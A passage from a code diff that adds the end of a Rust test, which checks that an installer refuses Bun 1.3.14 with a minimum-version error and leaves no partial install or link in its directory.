+            err.contains("does not start on bun 1.3.14: error: Bun runtime must be >= 1.4.4"),
+            "{err}"
+        );
+        let left: Vec<_> = std::fs::read_dir(hroot.join("omp"))
+            .unwrap()
+            .filter_map(|e| e.ok())
+            .map(|e| e.file_name().to_string_lossy().into_owned())
+            .filter(|n| !n.starts_with(".install.lock"))
+            .collect();
+        assert!(left.is_empty(), "no half install and no link: {left:?}");
+        let _ = std::fs::remove_dir_all(&tmp);
     }
 }
